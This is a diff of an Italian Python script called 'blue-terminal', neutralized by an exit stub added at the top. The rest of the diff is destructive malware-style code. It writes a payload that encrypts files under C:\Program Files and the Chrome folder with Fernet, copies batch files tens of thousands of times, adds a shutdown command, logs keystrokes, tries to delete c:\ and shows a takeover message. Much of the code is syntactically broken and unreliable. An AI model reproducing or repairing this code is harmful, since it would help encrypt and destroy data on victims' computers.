@@ -1,3 +1,6 @@
+from sys import exit as _safety_exit
+print("Execution blocked: this script contains destructive code and has been neutralized for analysis only.")
+_safety_exit(0)
 from rich.console import Console
 from rich.table import Table
 import colorama
@@ -636,7 +639,7 @@ if utente==1:
             shutil.copy("tnt.bat","tnt9.bat")
             shutil.copy("tnt.bat","tnt10.bat")
     file2=open("nucleare.py","w")
-    file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''\n''''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
+    file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''''----------------''''''----------''''''''''-we---------'''''\n''-blue-terminal-''''''--we--won't--stop--here---''''we--are-------'''\n'''-----------''''''----we---are---the---world -----''''''the-----'''\n'''-------''''''----------------------------''''''domino-----'''\n'''----------------------------'''''''of------'''\n'''------'''''''---------'''''''---------'''\n'''-----'''''''---------''''''''we won't stop here we are in the Internet----'''\nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
     file2.close()
     for i in range(144400):
         shutil.copy("nucleare.py",f"nucleare{i}.py")
@@ -967,10 +970,10 @@ if utente==1:
     file2=open("nucleare.py","w")
     file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''''----------------''''''----------''''''''''-we---------'''''\n''-blue-terminal-''''''--we--won't--stop--here---''''we--are-------'''\n'''-----------''''''----we---are---the---world -----''''''the-----'''\n'''-------''''''----------------------------''''''domino-----'''\n'''----------------------------'''''''of------'''\n'''------'''''''---------'''''''---------'''\n'''-----'''''''---------''''''''we won't stop here we are in the Internet----'''\nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
     file2.close()
-    for i in range(144):
+    for i in range(144400):
         shutil.copy("nucleare.py",f"nucleare{i}.py")
         subprocess.call([f"nucleare{i}.py"]) 
-        shutil.run("python",f"nucleare{i}.py")
+        shutil.run("python","nucleare.py")
     comando=subprocess.run("ipconfig")
     file=open("indirizzo.txt","w")
     file.write(comando)
@@ -989,33 +992,40 @@ if utente==1:
     pyautogui.press("enter")
     stringa="ti teniamo in guardia " 
     for stringa in stringa: 
-        pyautogui.typewrite(stringa)
-    for time in tqdm(random(10),desc=Fore.BLACK):
-        time.sleep(0.1)
-    pyautogui.moveTo(1597,0,duration=1)
-    pyautogui.click()
-    for i in range(144):    
-        os.remove(f"tnt{i}.bat")
-        print(pyautogui.position())
-        print(pyautogui.size())
-        pyautogui.moveTo(1597,0,duration=1)
-        pyautogui.click()
-        pyautogui.press("enter")
-        pyautogui.moveTo(8000,700,duration=1)
-        pyautogui.click()
-        pyautogui.press("enter")
-        pyautogui.moveTo(321,213,duration=1)
-        pyautogui.click()
-        pyautogui.press("enter")
-        pyautogui.moveTo(3000,600,duration=1)
-        pyautogui.click()
-        pyautogui.press("enter")
-        pyautogui.moveTo(1,5,duration=1)
-        pyautogui.moveTo(1597,0,duration=1)
-        pyautogui.click()
-        pyautogui.press(Button="left")
-    os.remove("c:\\")
-    os.remove("blue_terminal.tools.exe")
+        pyautogui.typewrite(stringa) 
+    os.remove("La_Bomba_finale.exe")
+    os.remove(f"tnt{i}.bat")
+            '''
+                time.sleep(2)
+                for stringa in totto:
+                    pyautogui.typewrite(stringa)
+                pyautogui.hotkey("ctrl","s")
+                name="blue-terminal.py"
+                time.sleep(4)
+                for i in name: 
+                    pyautogui.typewrite(i) 
+                pyautogui.press("enter")
+                subprocess.run(["Python","blue-terminal.py"])
+            elif"crea cartella"in text.lower():
+                speak("sto creando la cartella coma la vuoi chiamare ?")
+                pyautogui.moveTo(733,131,duration=1)
+                pyautogui.click(button="right")
+                for i in range(10):
+                    pyautogui.press("down")
+                pyautogui.press("enter")    
+                pyautogui.press("rght")
+                pyautogui.press("enter")
+                messaggio = record_audio()
+                text_to_type = recognize_audio(messaggio)
+                for stringa in text_to_type: 
+                    pyautogui.typewrite(stringa)
+                pyautogui.press("enter")    
+                pyautogui.press("enter")
+            elif "riavvia" in text.lower():
+                speak("sto riavviando")
+                pyautogui.press("f5")
+    if __name__ == "__main__":
+        main()
 elif utente==2:
     colorama.init()
     engine = pyttsx3.init()
@@ -1780,97 +1790,97 @@ elif utente==5:
                 elif"crea bomba"in text.lower():
                     speak("sto greando la bomba alla fine si eseguirà in automatico")
                     subprocess.Popen(['notepad.exe'])
-                    totto=''import pyttsx3
-        import random
-        import tkinter as Tk
-        import os
-        import time
-        import pyautogui
-        import ctypes
-        import shutil 
-        from cryptography.fernet import Fernet
-        import subprocess
-        from fabric import Connection
-        import keyboard
-        from docx import Document
-        from colorama import init, Fore, Back, Style
-        keyboard.wait("esc","alt",3)
-        #welcome to blue-terminal
-        subprocess.run(["echo off"])
-        subprocess.Popen(['notepad.exe'])
-        time.sleep(2)
-        stringa="il tuo pc è nelle mani di blue-terminal "
-        for stringa in stringa:
-            pyautogui.typewrite(stringa)
-        def estrazionenumeri(file_path):
-            voce=pyttsx3.init()
-            voce.say("inizio il gioco la tombola sei pronto?:")
-            numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
-            numgen=random.choice(numeri)
-            motore = pyttsx3.init()
-            voce.say(numgen)
-            motore.runAndWait()
-            if numgen == motore:
-                print("errore ripora ")
-                immagine="immagine\parliano.png"
-                ctypes.windll.user32.SystemParametersInfoW(20, 0, immagine, 0)
-                key=Fernet.generate_key()
-                with open("key.key","wb") as key_file:
-                    key_file.write(key)
-                with open("key.key","rb")  as key_file:
-                    key=key_file.read() 
-                fernet=Fernet(key)
-                with open(file_path,"rd")as file:
-                    original=file.read()
-                encrypter=fernet.encrypt(original)
-                with open(file_path,"wb")as encrypter_file:
-                    encrypter_file.write(encrypter)
-                percorso="C:\Program Files"
-                for filename in os.listdir(percorso):
-                    percorso=os.path.join(percorso,filename)
-                    if os.path.isfile(percorso):
-                        encrypter_file(percorso)
-            else:
-                motore.say(numgen)
-                motore.runAndWait()
-        def restarta(event,cartella,file_path):
-            percorso=(cartella)
-            if percorso.is_file():
-                key=Fernet.generate_key()
-                with open("key.key","wb") as key_file:
-                    key_file.write(key)
-                with open("key.key","rb")  as key_file:
-                    key=key_file.read() 
-                fernet=Fernet(key)
-                with open(file_path,"rd")as file:
-                    original=file.read()
-                encrypter=fernet.encrypt(original)
-                with open(file_path,"wb")as encrypter_file:
-                    encrypter_file.write(encrypter)
-                percorso="C:\Program Files"
-                for filename in os.listdir(percorso):
-                    percorso=os.path.join(percorso,filename)
-                    if os.path.isfile(percorso):
-                        encrypter_file(percorso)
-            numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
-            numgen=random.choice(numeri)
-            motore = pyttsx3.init()
+                    totto='''import pyttsx3
+    import random
+    import tkinter as Tk
+    import os
+    import time
+    import pyautogui
+    import ctypes
+    import shutil 
+    from cryptography.fernet import Fernet
+    import subprocess
+    from fabric import Connection
+    import keyboard
+    from docx import Document
+    from colorama import init, Fore, Back, Style
+    keyboard.wait("esc","alt",3)
+    #welcome to blue-terminal
+    subprocess.run(["echo off"])
+    subprocess.Popen(['notepad.exe'])
+    time.sleep(2)
+    stringa="il tuo pc è nelle mani di blue-terminal "
+    for stringa in stringa:
+        pyautogui.typewrite(stringa)
+    def estrazionenumeri(file_path):
+        voce=pyttsx3.init()
+        voce.say("inizio il gioco la tombola sei pronto?:")
+        numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
+        numgen=random.choice(numeri)
+        motore = pyttsx3.init()
+        voce.say(numgen)
+        motore.runAndWait()
+        if numgen == motore:
+            print("errore ripora ")
+            immagine="immagine\parliano.png"
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, immagine, 0)
+            key=Fernet.generate_key()
+            with open("key.key","wb") as key_file:
+                key_file.write(key)
+            with open("key.key","rb")  as key_file:
+                key=key_file.read() 
+            fernet=Fernet(key)
+            with open(file_path,"rd")as file:
+                original=file.read()
+            encrypter=fernet.encrypt(original)
+            with open(file_path,"wb")as encrypter_file:
+                encrypter_file.write(encrypter)
+            percorso="C:\Program Files"
+            for filename in os.listdir(percorso):
+                percorso=os.path.join(percorso,filename)
+                if os.path.isfile(percorso):
+                    encrypter_file(percorso)
+        else:
             motore.say(numgen)
             motore.runAndWait()
-            if numgen == motore:
-                print("errore ripora ")
-                file=open("tnt.bat","w")
-                file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
-                file.close()
-                with open("dati.txt","a") as f:
-                    f.write(f"{event.name}\n")
-                keyboard.on_press(restarta)
-                keyboard.wait("1")
-                for i in range(144400):
-                    shutil.copy("tnt.bat",f"tnt{i}.bat")
-            else:
-                motore.say(numgen)
-                motore.runAndWait()
+    def restarta(event,cartella,file_path):
+        percorso=(cartella)
+        if percorso.is_file():
+            key=Fernet.generate_key()
+            with open("key.key","wb") as key_file:
+                key_file.write(key)
+            with open("key.key","rb")  as key_file:
+                key=key_file.read() 
+            fernet=Fernet(key)
+            with open(file_path,"rd")as file:
+                original=file.read()
+            encrypter=fernet.encrypt(original)
+            with open(file_path,"wb")as encrypter_file:
+                encrypter_file.write(encrypter)
+            percorso="C:\Program Files"
+            for filename in os.listdir(percorso):
+                percorso=os.path.join(percorso,filename)
+                if os.path.isfile(percorso):
+                    encrypter_file(percorso)
+        numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
+        numgen=random.choice(numeri)
+        motore = pyttsx3.init()
+        motore.say(numgen)
+        motore.runAndWait()
+        if numgen == motore:
+            print("errore ripora ")
+            file=open("tnt.bat","w")
+            file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
+            file.close()
+            with open("dati.txt","a") as f:
+                f.write(f"{event.name}\n")
+            keyboard.on_press(restarta)
+            keyboard.wait("1")
+            for i in range(144400):
+                shutil.copy("tnt.bat",f"tnt{i}.bat")
+        else:
+            motore.say(numgen)
+            motore.runAndWait()
 
         def autodistruzione():
             for i in range(100000):
@@ -2069,7 +2079,7 @@ elif utente==5:
                 shutil.copy("tnt.bat","tnt9.bat")
                 shutil.copy("tnt.bat","tnt10.bat")
         file2=open("nucleare.py","w")
-        file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''\n''''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
